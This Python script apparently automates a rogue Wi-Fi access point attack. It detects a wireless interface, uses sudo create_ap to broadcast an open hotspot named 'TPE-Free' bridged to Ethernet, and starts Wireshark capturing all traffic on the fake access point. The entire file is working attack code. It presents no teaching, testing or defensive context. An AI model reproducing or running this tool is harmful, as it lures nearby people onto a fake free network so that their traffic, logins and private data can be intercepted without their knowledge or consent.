import subprocess
import sys
import shlex
import time

def wlan_interfaces(DEBUG):
    wireless_interfaces = []

    interfaces = subprocess.check_output("ip a", shell=True)
    interfaces = interfaces.decode().split("\n")
    if DEBUG:
        print(interfaces[3])
    for i in interfaces:
        if "wlan" in i.lower():
            wireless_interfaces.append(i.split(": "))
        if "wlx" in i.lower():
            wireless_interfaces.append(i.split(": "))
        if "wifi" in i.lower():
            wireless_interfaces.append(i.split(": "))
        if "wi-fi" in i.lower():
            wireless_interfaces.append(i.split(": "))
        if "wi fi" in i.lower():
            wireless_interfaces.append(i.split(": "))
        if "wireless" in i.lower():
            wireless_interfaces.append(i.split(": "))
    if len(wireless_interfaces) < 1:
        print("Could not find wireless inpsterface.")
        print("Please enter your wireless interface, please")
        target_interface = input(" >>> ")
        return target_interface
    else:
        print(wireless_interfaces)
        if DEBUG:
            for i in wireless_interfaces:
                print(i[0][1])
        print(wireless_interfaces)
        return wireless_interfaces[0][1]

def start_rogueAP(wlan_id, ethernet_id):
    ap_command = str(f"x-terminal-emulator -e 'sudo create_ap {wlan_id} {ethernet_id} TPE-Free'")
    ws_command = str("x-terminal-emulator -e 'sudo wireshark -k -i ap0'")
    subprocess.Popen(shlex.split(ap_command))
    time.sleep(10)
    subprocess.Popen(shlex.split(ws_command))

def main():
    wlan = wlan_interfaces(False)
    ethernet = "enp0s3"
    start_rogueAP(wlan, ethernet)

if __name__ == "__main__":
    main()
